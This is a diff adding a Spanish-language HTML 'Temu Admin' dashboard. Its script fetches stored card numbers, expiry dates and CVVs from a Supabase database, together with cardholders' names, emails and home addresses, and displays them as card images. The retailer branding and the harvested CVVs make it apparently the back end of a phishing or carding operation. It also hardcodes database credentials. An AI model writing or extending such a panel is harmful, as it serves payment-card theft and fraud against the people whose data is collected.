@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard de Tarjetas - Temu Admin</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        :root {
+            --primary: #fb7701;
+            --bg: #0f172a;
+            --card-bg: rgba(255, 255, 255, 0.05);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: #fff;
+            padding: 40px 20px;
+            min-height: 100vh;
+        }
+
+        .header {
+            max-width: 1200px;
+            margin: 0 auto 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        h1 {
+            font-size: 2rem;
+            color: var(--primary);
+        }
+
+        .refresh-btn {
+            background: var(--primary);
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: opacity 0.2s;
+        }
+
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 30px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        /* Premium Card Design */
+        .credit-card {
+            width: 100%;
+            height: 220px;
+            border-radius: 16px;
+            padding: 25px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            transition: transform 0.3s;
+            overflow: hidden;
+            text-transform: uppercase;
+        }
+
+        .credit-card:hover {
+            transform: translateY(-10px);
+        }
+
+        /* Card Variants (Gradients) */
+        .card-blue {
+            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
+        }
+
+        .card-black {
+            background: linear-gradient(135deg, #111827, #374151);
+        }
+
+        .card-purple {
+            background: linear-gradient(135deg, #581c87, #a855f7);
+        }
+
+        .card-orange {
+            background: linear-gradient(135deg, #9a3412, #f97316);
+        }
+
+        .card-red {
+            background: linear-gradient(135deg, #7f1d1d, #ef4444);
+        }
+
+        .card-green {
+            background: linear-gradient(135deg, #064e3b, #10b981);
+        }
+
+        .card-chip {
+            width: 50px;
+            height: 40px;
+            background: linear-gradient(135deg, #ffd700, #b8860b);
+            border-radius: 8px;
+            position: relative;
+        }
+
+        .card-chip::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70%;
+            height: 70%;
+            border: 1px solid rgba(0, 0, 0, 0.1);
+        }
+
+        .card-number {
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 1.4rem;
+            letter-spacing: 3px;
+            margin: 20px 0;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .card-info {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.8rem;
+        }
+
+        .info-label {
+            font-size: 0.6rem;
+            opacity: 0.8;
+            margin-bottom: 4px;
+        }
+
+        .card-holder {
+            font-weight: bold;
+        }
+
+        .card-logo {
+            position: absolute;
+            bottom: 25px;
+            right: 25px;
+            font-weight: 900;
+            font-style: italic;
+            font-size: 1.5rem;
+            opacity: 0.9;
+        }
+
+        .user-details {
+            margin-top: 15px;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            text-transform: none;
+        }
+
+        .loading {
+            text-align: center;
+            font-size: 1.2rem;
+            grid-column: 1 / -1;
+            padding: 40px;
+        }
+
+        .error {
+            color: #ff4444;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <h1>Admin Dashboard</h1>
+        <button class="refresh-btn" onclick="fetchCards()">Refrescar Datos</button>
+    </div>
+
+    <div id="cardsGrid" class="cards-grid">
+        <div class="loading">Cargando tarjetas...</div>
+    </div>
+
+    <script>
+        const SUPABASE_URL = 'https://jcgwmbtmfylmttxwmqzv.supabase.co';
+        const SUPABASE_KEY = 'sb_publishable_re7bQFvT9rggYPbtH260Pg_c6Pzw5jJ';
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        const cardColors = ['card-blue', 'card-black', 'card-purple', 'card-orange', 'card-red', 'card-green'];
+
+        async function fetchCards() {
+            const grid = document.getElementById('cardsGrid');
+            grid.innerHTML = '<div class="loading">Cargando datos de Supabase...</div>';
+
+            try {
+                // Fetch cards with related order info
+                const { data, error } = await supabaseClient
+                    .from('cards')
+                    .select(`
+                        id,
+                        card_number,
+                        expiry_date,
+                        cvv,
+                        state,
+                        orders (
+                            first_name,
+                            last_name,
+                            email,
+                            department,
+                            municipality,
+                            address
+                        )
+                    `)
+                    .order('created_at', { ascending: false });
+
+                if (error) throw error;
+
+                grid.innerHTML = '';
+
+                if (data.length === 0) {
+                    grid.innerHTML = '<div class="loading">No hay tarjetas registradas aún.</div>';
+                    return;
+                }
+
+                data.forEach((item, index) => {
+                    const color = cardColors[index % cardColors.length];
+                    const order = item.orders || {};
+                    const fullName = `${order.first_name || 'ANÓNIMO'} ${order.last_name || ''}`;
+
+                    const cardHtml = `
+                        <div class="card-container">
+                            <div class="credit-card ${color}">
+                                <div class="card-chip"></div>
+                                <div class="card-number">${formatNumber(item.card_number)}</div>
+                                <div class="card-info">
+                                    <div class="info-group">
+                                        <div class="info-label">Card Holder</div>
+                                        <div class="card-holder">${fullName}</div>
+                                    </div>
+                                    <div class="info-group">
+                                        <div class="info-label">Expires</div>
+                                        <div class="card-expiry">${item.expiry_date}</div>
+                                    </div>
+                                    <div class="info-group">
+                                        <div class="info-label">CVV</div>
+                                        <div class="card-cvv">${item.cvv}</div>
+                                    </div>
+                                </div>
+                                <div class="card-logo">VISA</div>
+                            </div>
+                            <div class="user-details">
+                                <strong>📍 Ubicación:</strong> ${order.municipality || '?'}, ${order.department || '?'}<br>
+                                <strong>🏠 Dirección:</strong> ${order.address || '?'}<br>
+                                <strong>📧 Email:</strong> ${order.email || '?'}
+                            </div>
+                        </div>
+                    `;
+                    grid.innerHTML += cardHtml;
+                });
+
+            } catch (err) {
+                console.error(err);
+                grid.innerHTML = `<div class="loading error">Error: ${err.message}</div>`;
+            }
+        }
+
+        function formatNumber(num) {
+            return num.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim();
+        }
+
+        // Initial Load
+        fetchCards();
+    </script>
+</body>
+
+</html>
